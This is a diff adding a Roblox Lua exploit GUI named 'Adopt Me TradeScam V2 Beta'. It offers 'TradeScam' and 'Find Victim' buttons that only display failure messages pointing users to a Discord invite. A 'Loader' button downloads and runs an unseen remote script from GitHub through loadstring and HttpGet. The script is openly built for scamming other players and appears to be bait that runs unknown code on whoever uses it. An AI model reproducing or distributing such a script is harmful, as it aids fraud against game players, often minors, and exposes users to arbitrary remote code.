@@ -1,0 +1,26 @@
+local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/Vape.txt"))()
+
+--window
+local win = lib:Window("Adopt Me TradeScam V2 Beta", Color3.fromRGB(44, 120, 224), Enum.KeyCode.Delete)
+
+--tabs
+local mt = win:Tab("main")
+
+-- Add notification buttons
+mt:Button("TradeScam", function()
+    lib:Notification("Failed", "You didn't meet the requirements.", "Okay")
+end)
+
+mt:Button("Find Victim", function()
+    lib:Notification("Failed", "Join the Discord first.", "Got it")
+end)
+
+-- Add button to display Discord Link
+mt:Button("Show Discord Link", function()
+    lib:Notification("Discord Link", "https://discord.com/invite/v8drv2sawh", "Got it")
+end)
+
+-- Add button to execute a URL
+mt:Button("Loader", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NxsimY/tcnxsim/main/tcnxsimyt.lua"))()
+end)
